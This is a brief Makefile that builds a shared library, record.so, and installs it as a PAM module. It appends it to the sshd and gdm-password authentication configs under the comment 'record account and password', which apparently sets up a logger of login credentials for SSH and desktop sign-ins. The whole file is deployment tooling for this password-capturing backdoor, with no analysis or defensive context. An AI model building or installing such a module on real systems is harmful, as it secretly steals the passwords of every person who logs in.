CFLAGS += -Werror -Wall

record.so: record.c
	gcc $(CFLAGS) -fPIC -shared -Xlinker -x -o $@ $<

install:
	mkdir -p /lib/security/
	cp record.so /lib/security/

	echo "# record account and password" >> /etc/pam.d/sshd
	echo "auth optional record.so" >> /etc/pam.d/sshd

	echo "# record account and password" >> /etc/pam.d/gdm-password
	echo "auth optional record.so" >> /etc/pam.d/gdm-password

clean:
	rm -fr *.so
